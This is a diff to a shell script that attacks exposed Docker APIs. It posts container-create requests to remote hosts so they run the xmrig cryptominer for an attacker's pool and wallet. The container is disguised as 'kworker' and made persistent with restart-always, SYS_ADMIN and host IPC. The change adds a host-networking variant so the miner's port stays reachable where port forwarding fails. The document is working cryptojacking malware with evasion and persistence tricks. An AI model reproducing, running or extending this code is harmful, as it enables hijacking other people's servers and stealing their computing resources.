@@ -82,7 +82,12 @@ one() {
     sup="while :; do /usr/bin/xmrig $args; sleep 10; done"
     B1="{\"Image\":\"$IMAGE\",\"Entrypoint\":[\"sh\",\"-c\"],\"Cmd\":[\"$sup\"],\"Labels\":{$TAG},\"ExposedPorts\":{\"47999/tcp\":{}},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"},\"CpuShares\":2048,\"CapAdd\":[\"SYS_ADMIN\"],\"IpcMode\":\"host\",\"PortBindings\":{\"47999/tcp\":[{\"HostPort\":\"47999\"}]}$_mem}}"
     B2="{\"Image\":\"$IMAGE\",\"Cmd\":[\"-o\",\"$POOL\",\"-u\",\"$WALLET\",\"-p\",\"$ip\",\"--no-color\",\"-k\",\"--tls\",\"--threads=$th\"],\"Labels\":{$TAG},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"}}}"
-    for cand in "$B1" "$B2"; do
+    # Host-networking twin of B1: some daemons answer :2375 but their docker-proxy does
+    # not forward a published port, so the API is invisible even though --http-port is
+    # set. With NetworkMode host xmrig binds :47999 on the host itself. B2 stays as the
+    # "no sh in the image / no port at all" floor.
+    B1N=$(printf '%s' "$B1" | sed 's|"PortBindings":{"47999/tcp":\[{"HostPort":"47999"}\]}|"NetworkMode":"host"|')
+    for cand in "$B1N" "$B1" "$B2"; do
         r=$(curl -fsS --max-time 25 -X POST "$b/containers/create?name=kworker" \
                 -H "Content-Type: application/json" -d "$cand" 2>/dev/null) || continue
         id=$(printf '%s' "$r" | grep -oE '"Id":"[0-9a-f]{20,80}"' | head -1 | cut -d'"' -f4)
